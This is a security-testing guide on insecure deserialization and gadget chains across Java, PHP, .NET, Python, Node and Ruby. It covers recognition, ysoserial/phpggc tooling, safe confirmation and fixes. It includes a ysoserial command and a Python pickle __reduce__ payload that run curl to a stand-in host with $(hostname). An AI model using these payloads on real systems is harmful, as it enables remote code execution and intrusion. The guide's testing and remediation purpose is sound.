# Insecure Deserialization & Gadget Chains — Deep Dive

Deserializing attacker bytes lets the attacker choose which objects get constructed and which
"magic" methods run during/after construction. A **gadget chain** stitches together methods that
already exist in the app's libraries so that reconstruction ends in code execution. This is the
per-runtime mechanic level, for authorized testing with non-destructive proofs.

## The core idea

Serialization formats restore object state and call lifecycle hooks (`readObject`, `__wakeup`,
`__destruct`, `ObjectInputStream` resolution, pickle's `__reduce__`). A gadget is a class whose
hook does something useful; a chain links a hook that calls a method that calls another … ending at
`Runtime.exec` / `system` / `eval`. The attacker doesn't add code — they assemble existing code.

## Java

- **Recognize:** base64 `rO0AB…` or hex `ac ed 00 05`; `readObject` / `ObjectInputStream` on
  untrusted input; `Serializable` types across a boundary; JMX/RMI, some JSON libs with default
  typing.
- **Chains:** `ysoserial` implements known ones — CommonsCollections1-7, Spring1/2, Groovy,
  Hibernate, JRMP, etc. The chain used depends on which libraries (and versions) are on the
  classpath.
- **Generate (authorized lab):** `java -jar ysoserial.jar CommonsCollections6 'curl http://you/$(hostname)' | base64`
  then deliver where the app deserializes. Use a **callback**, not a destructive command.
- **JNDI/log4shell family** is adjacent: attacker-controlled lookup → remote class load.

## PHP (POP chains)

- **Recognize:** `unserialize()` on user input; strings like `O:8:"stdClass":1:{...}`; Phar
  deserialization triggered by filesystem functions on a `phar://` path.
- **POP chain:** chain `__wakeup`/`__destruct`/`__toString` across the app's own classes to reach a
  dangerous call. `phpggc` generates chains for common frameworks (Laravel, Symfony, Monolog,
  Guzzle).
- **Phar trick:** even without a direct `unserialize`, a file function (`file_exists`, `fopen`) on
  an attacker-influenced `phar://` path deserializes the Phar's metadata.

## .NET

- **Recognize:** `BinaryFormatter`, `LosFormatter`, `ObjectStateFormatter`, `NetDataContractSerializer`,
  `Json.NET` with `TypeNameHandling != None`, `__VIEWSTATE` (esp. with a known/again default machine
  key).
- **Chains:** `ysoserial.net` (TypeConfuseDelegate, ActivitySurrogateSelector, ViewState, etc.).
  ViewState RCE hinges on a leaked/guessable `machineKey`.

## Python

- **Recognize:** `pickle`/`cPickle.loads`, `PyYAML yaml.load` (unsafe), `jsonpickle`, `shelve`,
  `dill`.
- **Mechanic:** `__reduce__` returns `(callable, args)` executed on load:
  ```python
  class E:
      def __reduce__(self):
          import os; return (os.system, ("curl http://you/$(hostname)",))
  pickle.dumps(E())
  ```
  Use a callback command. `yaml.load` with `!!python/object/apply:os.system` is the YAML analog.

## Node / Ruby

- **Node:** `node-serialize` (`_$$ND_FUNC$$_` IIFE executes on unserialize), unsafe `eval`-based
  deserializers.
- **Ruby:** `Marshal.load` on untrusted data; unsafe YAML (`Psych` with permitted classes) — known
  universal gadget chains exist for common gem sets.

## Where it hides

Session cookies, view state, "remember me", cache/queue messages, inter-service RPC, import
features, and anywhere an object round-trips. The worst cases **deserialize before authenticating**.

## Confirming safely

- Blind by nature → confirm with **OOB** (DNS/HTTP callback carrying `hostname`/`whoami`), a timing
  gadget (`sleep`), or a marked file you remove. Never a destructive command; act only on your own
  test resources.
- Match the gadget to libraries *actually present* — a chain for a lib that isn't there just errors.

## Reporting

Show the serialized input location and format, the chain/library used, and unambiguous OOB proof of
execution — with a benign payload and a note that you avoided any destructive action. This class is
typically critical (RCE); the proof must be clean and the impact explicit. Fix: don't deserialize
untrusted input; use data-only formats with strict types / allowlists; sign+verify where a blob must
round-trip.
